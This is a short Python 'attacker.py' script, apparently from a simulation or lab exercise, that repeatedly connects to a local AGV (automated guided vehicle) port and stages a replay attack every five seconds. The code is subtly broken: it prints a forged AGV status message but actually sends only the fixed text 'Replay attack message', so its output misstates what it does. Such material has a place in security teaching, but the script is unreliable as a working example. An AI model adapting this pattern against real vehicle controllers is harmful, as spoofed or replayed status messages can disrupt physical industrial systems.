import socket
import time

def replay_attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 6001))  # 模拟攻击AGV1的端口
    message = '{"id": "AGV-1", "position": [3, 1], "status": "idle", "confirmed": true}'
    while True:
        s.sendall(b'Replay attack message')
        print(f"Replay attack: {message}")
        time.sleep(5)  # 每5秒发起一次攻击

if __name__ == "__main__":
    print(f"########################This is the attacker.py########################")
    replay_attack()
